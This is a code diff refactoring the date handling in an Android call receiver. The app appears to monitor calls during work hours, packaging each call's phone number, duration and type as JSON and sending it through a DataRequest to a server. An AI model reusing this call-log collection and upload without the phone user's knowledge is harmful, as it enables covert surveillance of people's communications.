@@ -1,13 +1,10 @@
 package com.inet.android.call;
 
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
 import java.util.concurrent.TimeUnit;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -18,6 +15,7 @@ import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 
 import com.inet.android.request.DataRequest;
+import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
 
@@ -29,10 +27,8 @@ import com.inet.android.utils.WorkTimeDefiner;
  */
 public class CallReceiver extends BroadcastReceiver {
 	private Context ctx;
-	private String date;
 	private SharedPreferences sp;
 	private static String LOG_TAG = "callReceiver";
-
 	@Override
 	public void onReceive(Context arg0, Intent intent) {
 		sp = PreferenceManager.getDefaultSharedPreferences(arg0);
@@ -55,7 +51,6 @@ public class CallReceiver extends BroadcastReceiver {
 					"isWork - " + Boolean.toString(isWork));
 		}
 
-		date = logTime();
 		ctx = arg0;
 
 		if (intent.getAction()
@@ -123,12 +118,14 @@ public class CallReceiver extends BroadcastReceiver {
 		String sendJSONStr = null;
 		JSONObject info = new JSONObject();
 		JSONObject object = new JSONObject();
+		ConvertDate getDate = new ConvertDate();
+		
 		try {
 
 			info.put("number", phNumber);
 			info.put("duration", callDuration);
 
-			object.put("time", date);
+			object.put("time", getDate.logTime());
 			object.put("type", callTypeStr);
 			object.put("info", info);
 			// sendJSONStr = jsonObject.toString();
@@ -141,14 +138,5 @@ public class CallReceiver extends BroadcastReceiver {
 
 		DataRequest dr = new DataRequest(ctx);
 		dr.sendRequest(sendJSONStr);
-	}
-
-	@SuppressLint("SimpleDateFormat")
-	private String logTime() {
-		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-		Calendar cal = Calendar.getInstance();
-		cal.setTimeInMillis(System.currentTimeMillis());
-		return "" + formatter.format(cal.getTime());
-
 	}
 }
